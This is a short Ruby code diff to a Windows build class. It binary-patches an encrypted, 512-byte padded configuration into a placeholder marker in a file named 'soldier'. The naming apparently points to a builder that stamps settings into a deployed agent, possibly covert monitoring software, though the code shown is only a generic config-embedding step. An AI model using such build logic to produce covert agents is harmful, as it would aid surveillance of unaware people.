@@ -57,7 +57,10 @@ class BuildWindows < Build
     patch_file(:file => 'soldier') do |content|
       begin
         marker = "Config"
-        #TODO: binary patch the config
+        # binary patch the config
+        config = @factory.configs.first.encrypted_soldier_config(@factory.confkey)
+        # pad the config to 512 bytes
+        content.binary_patch 'CONF'*128, config.ljust(512, "\x00")
       rescue Exception => e
         raise "#{marker} marker not found: #{e.message}"
       end
